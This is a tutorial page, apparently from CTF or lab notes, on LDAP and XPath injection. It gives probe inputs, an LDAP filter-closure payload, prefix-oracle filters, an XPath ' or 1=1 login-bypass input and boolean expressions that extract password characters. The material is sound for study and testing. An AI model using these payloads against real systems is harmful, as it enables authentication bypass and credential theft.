---
title: "LDAP / XPath Injection"
weight: 74
bookToc: true
---

# LDAP and XPath Injection

These query languages do not share SQL grammar. Quotes, comments, schema discovery, and wildcard meaning depend on the actual parser.

## LDAP: identify a filter string

Possible source:

```text
(uid=INPUT)
(&(uid=USERINPUT)(userPassword=PASSINPUT))
```

Useful first probes for a search filter:

```text
alice
*
alice*
(
)
\
```

| Result | Interpretation |
| --- | --- |
| `*` returns many entries | Wildcard accepted, possibly intended search behavior |
| Unbalanced `(` or `)` gives filter syntax error | Potential filter-string construction |
| Structured filter injection changes logic | Stronger evidence of LDAP injection |

For source exactly constructing `(&(uid=INPUT)(department=public))`, this input:

```text
*)(|(department=*)(department=
```

produces:

```text
(&(uid=*)(|(department=*)(department=)(department=public)))
```

It changes the query grouping so the intended department restriction is no longer independently required. This **specific closure depends on the exact original filter**. Do not apply it to a different login template.

For a simple `(uid=INPUT)` filter, `*` already expands the query. For a login that first searches and then performs an LDAP bind with the supplied password, a broad search alone does **not** bypass the bind.

### Prefix oracle

If the response reveals whether an entry exists, and a field supports substring matching:

```text
(uid=a*)
(uid=b*)
(uid=ad*)
(uid=adm*)
```

These are complete conceptual filters. Insert only the relevant value if the application constructs the rest. Narrow to a unique entry and field; matching behavior varies by attribute schema and server.

### Literal LDAP filter escapes

| Character | Filter escape |
| --- | --- |
| `*` | `\2a` |
| `(` | `\28` |
| `)` | `\29` |
| `\` | `\5c` |
| NUL | `\00` |

These are LDAP **filter** escapes, not DN escaping and not URL encoding. A properly escaped literal asterisk should not act as a wildcard. Compare escaped and unescaped input to understand the layer.

## XPath: confirm a boolean expression

Possible XPath 1.0 query:

```text
//users/user[username='INPUT' and password='PASS']
```

For the username input, compare:

```text
' or 1=1 or 'a'='b
' or 1=2 or 'a'='b
```

For this exact template, the true input becomes:

```text
//users/user[username='' or 1=1 or 'a'='b' and password='PASS']
```

The always-true middle disjunct makes the predicate true independently of the password. The false control is false provided no user has an empty username. A shorter input such as `' or '1'='1` leaves the password test attached to that comparison by `and` precedence, so both controls can fail with a wrong password. XPath has no SQL `--` comment; reconstruct the entire expression instead of copying SQL suffixes.

## XPath: enumerate with a boolean oracle

XPath 1.0 expressions useful inside an established oracle:

```text
count(//users/user)>1
string-length(string((//users/user/password)[1]))>10
substring(string((//users/user/password)[1]),1,1)='a'
starts-with(string((//users/user/password)[1]),'flag{')
name(/*)='users'
count(/*/*)>2
```

First identify the XML structure with `name`, `count`, and child navigation. XPath 1.0 does not have a universally available `ascii()` function. Manual candidate-character equality / `contains` partitioning can replace SQL-style character-code extraction.

XPath versions and host libraries differ. A visible XML document does not prove user input reaches XPath. XXE is a separate [XML parser issue](../xxe/).

Tool map: [Burp](../../ajcbbc_allow_tools/burp_suite_community/) · [Python](../../ajcbbc_allow_tools/python3/) · [Notepad++](../../ajcbbc_allow_tools/notepad_plus_plus/).

References: [LDAP filter syntax RFC 4515](https://www.rfc-editor.org/rfc/rfc4515), [XPath 1.0](https://www.w3.org/TR/1999/REC-xpath-19991116/), [OWASP XPath injection](https://owasp.org/www-community/attacks/XPATH_Injection).
